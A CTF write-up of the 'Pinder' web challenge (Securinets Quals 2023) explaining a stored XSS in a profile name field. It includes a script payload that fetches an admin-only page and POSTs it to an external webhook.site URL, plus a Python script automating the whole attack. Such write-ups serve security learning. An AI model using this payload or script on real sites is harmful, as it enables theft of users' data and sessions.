
[toc]

{%hackmd @abc90/temp %}

Original article see: [TaiPhung217 - github](https://github.com/TaiPhung217/CTF_writeup/tree/main/2023/Securinets%20Quals%202023)


# Pinder

## Description

![](https://hackmd.io/_uploads/rkatqgpjn.png)

Link: http://pinder.securinets.tn

Source code [here](https://github.com/TaiPhung217/CTF_writeup/blob/main/2023/Securinets%20Quals%202023/pinder.zip).


## Solution

## Review source code

The source code is quite a lot but I will focus on a few important files.

![](https://hackmd.io/_uploads/H1aIoe6o2.png)

After looking through the entire source code, I noticed that there are some functions that should be paid attention to as follows:

- In the file `./routes/index.js`:

 `login`:

![](https://hackmd.io/_uploads/HJQcaeasn.png)

`register`:

![](https://hackmd.io/_uploads/B1Fa6lash.png)

`create-profile` and `make-public`:

![](https://hackmd.io/_uploads/rJRJReaj3.png)

In this function 3 inputs are required including `userId`, `firt_name`, `last_name` and `profile_picture_link`.

`const result = db.createProfile(req.session.userId, req.body.first_name, req.body.last_name, req.body.profile_picture_link, true);`


`/my-profile`:

![](https://hackmd.io/_uploads/By7FAlajh.png)

This path allows you to view previously created profiles. in which there is a point worth noting.

`res.render("my-profile", { profile: result[0] }` function gets the profile id in the database and displays it to the interface.

Here is the result of `result`:

![](https://hackmd.io/_uploads/B1B-1-Tj2.png)

However, on the desktop interface, the profile id is hidden with `style="display:none"`.

![](https://hackmd.io/_uploads/r12Qyb6jn.png)

There are also 2 other paths but only for admin.

![](https://hackmd.io/_uploads/H1ldJWpoh.png)

admin can view profiles of other accounts through the path `/profile/{id}`.

![](https://hackmd.io/_uploads/S1-aJbToh.png)


- The flag is located in the profile of `admin`.

![](https://hackmd.io/_uploads/rkrEeZTih.png)

- I tried to create a template containing malicious javascript code and open it in `admin` account.

In my account.

![](https://hackmd.io/_uploads/BkCYZZpj3.png)

In `admin`.

![](https://hackmd.io/_uploads/rJGab-ain.png)

yeah. :100: I received a message - XSS stored vulnerability from `admin` side.


- In `./util/report.js`:
There is a requirement, the url when sumit must start with `http://127.0.0.1/profile`.

![](https://hackmd.io/_uploads/B1UdMZpo2.png)

:::success
=> At this point, I can guess that this web application contains an XSS stored vulnerability.

The mining steps I perform will be as follows:
- Create an account and login
- Create profile contains XSS code to fetch to the profile in admin and send the results to a webhook.
- Get `id` of `profile` just created in view-source
- Submit my-profile to admin with the link `http://127.0.0.1/profile/{id}`
- Get flags from webhook
:::


## Exploit XSS
- Now, I change a bit the old payload to .
```!
"><script>fetch('http://127.0.0.1/my-profile').then(response => response.text()).then(data => {fetch('	https://webhook.site/9a0f20d5-7f92-43bb-a455-5d82fd12eb17',{method: 'POST', headers: {'Content-Type': 'text/plain'},body: data});}).catch(error => console.error(error));</script>
```

- Add it to the `firtname` of the profile.

![](https://hackmd.io/_uploads/BkxpQZpon.png)

Done!

- Looking at the source code we can see that `profile id` is `485`

![](https://hackmd.io/_uploads/S1GN4Zpoh.png)


- Now submit my profile to admin with the link
`http://127.0.0.1/profile/485`

![](https://hackmd.io/_uploads/ByiDNbTj3.png)

- ok, i get the flag from webhook.

![](https://hackmd.io/_uploads/HkU84b6in.png)

Flag: `securinets{3bcc81811533d70940084c8}`


## Script

```python
import requests
import string
import random

import time

from bs4 import BeautifulSoup

url = "http://pinder.securinets.tn"

webhook = "https://webhook.site/c575a735-3aaf-4b9a-b8b9-4eeba169e356"

payload = "'><script>fetch('http://127.0.0.1/my-profile').then(response => response.text()).then(data => {fetch('#####',{method: 'POST', headers: {'Content-Type': 'text/plain'},body: data});}).catch(error => console.error(error));</script>"

with requests.Session() as session:
    username = ''.join(random.choices(string.ascii_letters + string.digits, k=3))

    session.post(url + '/register', json={ 'username': username, 'password': '12345678'})
    session.post(url + '/login', json={ 'username': username, 'password': '12345678' })
    payload = payload.replace('#####', webhook)
    session.post(url + '/create-profile', json={"first_name":payload,"last_name":payload,"profile_picture_link":payload} )
    res = session.get(url + '/my-profile')
    if res.status_code == 200:
        soup = BeautifulSoup(res.content, "html.parser")
        card_subtitle = soup.find("p", class_="card-subtitle")
    
    if card_subtitle:
        value = card_subtitle.get_text().strip("#")
        print("Id profile: ", value)
        
    session.post(url + '/report', json={"url":"http://127.0.0.1/profile/" + value})
    time.sleep(2)
    print('Done! check webhook')


```

Result:
```
┌──(taiwhis㉿kali)-[~]
└─$ python 2.py
Id profile:  517
Done! check webhook

```
Check webhook:

![](https://hackmd.io/_uploads/Syc66Zpj3.png)




